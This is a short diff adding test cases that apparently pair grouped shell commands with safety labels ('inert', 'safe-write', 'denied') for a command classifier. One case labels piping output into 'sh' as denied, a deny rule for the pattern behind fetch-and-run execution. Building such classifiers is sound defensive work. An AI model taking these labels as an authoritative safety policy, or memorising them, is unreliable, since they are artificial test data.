+{ echo a; } && { echo b; }	inert
+{ echo a; } 2>&1	inert
+{ echo a; } >> /tmp/log.txt	safe-write
+{ echo a; } | sh	denied
+{ echo noisy; echo more; } > /dev/null	inert
+{ sed -n '1,2p' /tmp/h2.txt; sed -n '4p' /tmp/h2.txt; } > /tmp/trip4-noblank.txt	safe-write
+{ { echo inner; }; echo outer; }	inert
